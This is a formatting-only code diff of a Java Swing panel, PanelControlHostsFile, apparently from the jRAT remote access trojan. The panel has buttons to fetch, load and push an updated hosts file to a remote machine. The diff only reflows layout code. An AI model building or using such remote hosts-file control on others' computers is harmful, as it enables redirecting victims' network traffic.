@@ -23,7 +23,6 @@ import pro.jrat.packets.outgoing.Packet55HostsFile;
 import pro.jrat.packets.outgoing.Packet56UpdateHostsFile;
 import pro.jrat.utils.Utils;
 
-
 @SuppressWarnings("serial")
 public class PanelControlHostsFile extends PanelControlParent {
 
@@ -66,7 +65,7 @@ public class PanelControlHostsFile extends PanelControlParent {
 			}
 		});
 		btnUpdateHostsFile.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/host.png")));
-		
+
 		JButton btnGetLocalHosts = new JButton("Get local hosts file");
 		btnGetLocalHosts.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -87,42 +86,12 @@ public class PanelControlHostsFile extends PanelControlParent {
 			}
 		});
 		btnGetLocalHosts.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/left.png")));
-		
+
 		JSeparator separator = new JSeparator();
 		separator.setOrientation(SwingConstants.VERTICAL);
 		GroupLayout groupLayout = new GroupLayout(this);
-		groupLayout.setHorizontalGroup(
-			groupLayout.createParallelGroup(Alignment.LEADING)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
-						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE)
-						.addGroup(groupLayout.createSequentialGroup()
-							.addContainerGap()
-							.addComponent(btnClear)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(btnGetHostsFile)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(btnGetLocalHosts)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(separator, GroupLayout.PREFERRED_SIZE, 1, GroupLayout.PREFERRED_SIZE)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(btnUpdateHostsFile)))
-					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
-		);
-		groupLayout.setVerticalGroup(
-			groupLayout.createParallelGroup(Alignment.LEADING)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 301, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.UNRELATED)
-					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
-						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
-							.addComponent(btnClear)
-							.addComponent(btnGetHostsFile)
-							.addComponent(btnGetLocalHosts))
-						.addComponent(separator, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE)
-						.addComponent(btnUpdateHostsFile))
-					.addContainerGap(13, Short.MAX_VALUE))
-		);
+		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnGetHostsFile).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnGetLocalHosts).addPreferredGap(ComponentPlacement.RELATED).addComponent(separator, GroupLayout.PREFERRED_SIZE, 1, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnUpdateHostsFile))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
+		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 301, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnClear).addComponent(btnGetHostsFile).addComponent(btnGetLocalHosts)).addComponent(separator, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE).addComponent(btnUpdateHostsFile)).addContainerGap(13, Short.MAX_VALUE)));
 
 		txt = new JTextPane();
 		scrollPane.setViewportView(txt);
